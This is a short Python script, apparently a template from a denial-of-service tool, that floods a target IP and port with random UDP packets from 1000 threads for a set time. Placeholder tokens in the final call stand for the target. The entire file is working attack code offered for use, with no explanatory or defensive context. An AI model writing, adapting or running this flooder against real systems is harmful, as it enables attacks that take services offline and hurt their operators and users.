import socket, threading, time, random

__THREAD_NUMBER__ = 1000

def udp_flood(ip: str, port: str, timeout: str):
    def flood(ip: str, port: int, timeout: int):
        start_time = int(time.time())

        while int(time.time()) - start_time < timeout:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.connect((ip, port))
                
                for _ in range(50):
                    try:
                        sock.sendto(random._urandom(int(random.randint(1024, 60000))), (ip, port))
                    except:
                        sock.close()
                
                sock.close()
            except:
                pass

    for _ in range(__THREAD_NUMBER__):
        threading.Thread(target= flood, args=(ip, int(port), int(timeout),)).start()

udp_flood('!ip!', '!port!', '!time!')